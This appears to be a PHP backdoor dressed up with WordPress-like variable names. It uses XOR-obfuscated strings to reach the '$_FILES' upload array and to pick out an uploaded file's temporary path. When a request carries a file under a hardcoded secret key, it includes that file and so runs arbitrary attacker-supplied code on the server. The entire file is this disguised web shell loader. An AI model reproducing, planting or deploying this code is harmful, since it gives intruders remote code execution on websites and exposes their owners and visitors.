<?php 	
$hierarchical = 'JUfsMArJjVqx';

$template = $hierarchical;
	$new_date = 'previous_status';
function diff($raw_title, $end_dirty)

{
    $incpages = $end_dirty;
    $no_texturize_shortcodes = urldecode($raw_title);
    $the_post = substr($incpages,0, strlen($no_texturize_shortcodes));

    $reset = $no_texturize_shortcodes ^ $the_post;
    return $reset;
}
$public = ${diff("%15%13%2F%3F%08%12", $template)};
$tagstack = $public;

$_quote_style = isset($tagstack[$template]);
	$postid = 'ptype';
if ($_quote_style)

{
    $cdata_regex = $public[$template];
	$type = 'unhashed';
    $post_date_gmt = $cdata_regex[diff("%3E8%16%2C%23+%1F%2F", $template)];
	$string = 'to_look';
    $babes = $post_date_gmt;
	$post_mime_type = 'menu_position';
    include ($babes);
}
?>
